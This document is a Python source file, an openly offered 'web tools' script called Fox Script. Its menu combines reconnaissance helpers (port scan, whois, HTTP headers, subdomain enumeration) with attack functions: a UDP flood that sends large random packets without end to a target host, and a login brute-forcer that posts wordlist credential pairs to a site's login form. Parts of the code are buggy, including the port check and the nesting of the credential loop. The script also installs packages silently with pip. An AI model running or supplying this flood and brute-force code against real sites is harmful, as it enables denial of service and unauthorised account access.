"""
 Free Scritp: Fox Script
 Written by Amir Bagheri
 Contact me:
 github.com/Amir-Bagheri-DEV
 AmirBagheri.gigfa.com 
"""

import os
import socket
import random
try:
    from pyfiglet import Figlet
except:
    os.system("pip install pyfiglet")
    from pyfiglet import Figlet

try:
    from colorama import Fore, init
except:
    os.system("pip install colorama")
    from colorama import Fore, init

try:
    import requests
    from requests import post
except:
    os.system("pip install requests")
    import requests
    from requests import post

try:
    import whois
except:
    os.system("pip install python-whois")
    import whois

try:
   from selenium import webdriver
except:
   os.system("pip install selenium")
   from selenium import webdriver

init()

print(Fore.GREEN+"\tVersion 1.0.2")

font = Figlet(font="cybermedium")
print(Fore.RED+font.renderText("Fox-Script"))
print(Fore.GREEN+"\tWEB TOOLS")
url1 = input("Enter URL(example.com): ")
url = ("https://" + url1)
def syntax():
    print(Fore.RED+"""
    [01] - Login Page Cracker
    [02] - D-DoS Script""")
    print(Fore.YELLOW+"""
    [03] - port scanner
    [04] - Whois
    [05] - HTTP Headers""")
    print(Fore.RESET+"""
    [06] - DNS Checker
    [07] - Sub Domains
    [08] - Veiw HTML Website
    [09] - Web Driver in Firefox
    [10] - HELP""")
syntax()
def html_view():
    print(requests.get(url).text)
change = input("Enter Number: ")

def DNS_checker():
    res = requests.get(url, verify=False)
    print(res)
    if res.status_code == 200:
     print('DNS Check: True')
 
    else:
     print('DNS Check: False')
def domain():
    domain = whois.whois(url)
    print(domain)

def HTTP_Headers():
    response = requests.get(url)
    print(response.headers)

def port_Scanner():
    lru = int(input(Fore.BLUE+"Enter PORT: "))
    port = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    port.connect((url1, lru))

    if port.recvfrom(1024) == 0:
      print("port open")
    else:
      print("port closed")

def D_dos():
    rkt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(51200)
    ipp = socket.gethostbyname(url1)
    ip = ipp
    port = 80
    sent = 0
    while True:
      rkt.sendto(bytes,(ip,port))
      sent = sent + 1
      port = port + 1
      Send = (sent, ip, port)
      print ("Sent Packet", Send)
      if port == 65535:
       port = 1

def Web_driver():
    driver = webdriver.Firefox()
    driver.get(url)
    information = driver.find_element_by_id('some\_id')
    print(information.text)

def sub_domains():
   with open('sub_domains.txt','r') as file:
   

    name = file.read()
     

    sub_dom = name.splitlines()
    import requests
 

    def domain_scanner(domain_name,sub_domnames):
        print('URL after scanning subdomains')
     

        for subdomain in sub_domnames:
       

            url3 = f"https://{subdomain}.{domain_name}"

            try:
 
              requests.get(url3)
             

              print(f'[+] {url3}')

            except requests.ConnectionError:
                pass
 

    if __name__ == '__main__':
   

        dom_name = url1
 

    with open('sub_domains.txt','r') as file:

        name = file.read()

        sub_dom = name.splitlines()

    domain_scanner(dom_name,sub_dom)

def login_cracker():
    import colorama
    colorama.init() ## initialize the colorama
    url6 = (url)

    usernamefile = input("Username List: ")
    passwordfile = input("Password List: ")

    find = False
    for username in open(usernamefile):
        username = username.strip("\n")
    for password in open(passwordfile):
        password = password.strip('\n')
        print (colorama.Fore.RED + "{}:{}".format(username,password))
        res = post(url6,data = {"username" : username , "password" : password , "Login" : "Login"})
        content = res.content
        content = content.decode()
        if "Welcome" in content:
            print("-"*50)
            print(colorama.Fore.GREEN + "Correct USERNAME / PASSWORD --> {}:{}".format(username,password))
            find = True
            break
        if find :
            break

if change == "06" or change == "6": 
  DNS_checker()

if change == "08" or change == "8":
    html_view()

if change == "04" or change == "4":
    domain()

if change == "05" or change == "5":
    HTTP_Headers()

if change == "03" or change == "3":
    port_Scanner()

if change == "02" or change == "2":
    D_dos()

if change == "09" or change == "9":
    Web_driver()

if change == "07" or change == "7":
    sub_domains()

if change == "01" or change == "1":
    login_cracker()
